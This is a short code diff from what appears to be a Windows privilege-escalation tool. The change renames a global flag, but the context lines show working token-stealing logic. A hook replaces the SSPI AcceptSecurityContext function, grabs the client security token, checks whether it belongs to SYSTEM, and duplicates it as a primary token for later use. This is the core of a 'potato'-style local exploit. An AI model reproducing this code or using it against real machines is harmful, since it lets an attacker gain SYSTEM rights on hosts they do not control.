@@ -11,7 +11,7 @@ extern HANDLE g_hEventTokenStolen;
 extern HANDLE g_hEventAuthTriggered;
 extern HANDLE g_hTokenStolenPrimary;
 extern HANDLE g_hTokenStolenSecondary;
-extern BOOL systemTokenStolen;
+extern BOOL g_SystemTokenStolen;
 wchar_t* g_Clsid;
 
 int IsTokenSystem(HANDLE tok, wchar_t* clsid);
@@ -26,7 +26,7 @@ SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle 
 		QuerySecurityContextToken(phContext, &g_hTokenStolenSecondary);
 		if (IsTokenSystem(g_hTokenStolenSecondary, g_Clsid)) {
 			DuplicateTokenEx(g_hTokenStolenSecondary, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_hTokenStolenPrimary);
-			systemTokenStolen = TRUE;
+			g_SystemTokenStolen = TRUE;
 		}
 		SetEvent(g_hEventTokenStolen);
 	}
@@ -37,7 +37,7 @@ void HookSSPIForTokenStealing(wchar_t *clsid) {
 	g_Clsid = clsid;
 	g_hTokenStolenPrimary = NULL;
 	g_hTokenStolenSecondary = NULL;
-	systemTokenStolen = FALSE;
+	g_SystemTokenStolen = FALSE;
 	PSecurityFunctionTableW table = InitSecurityInterfaceW();
 	table->AcceptSecurityContext = AcceptSecurityContextHook;
 }
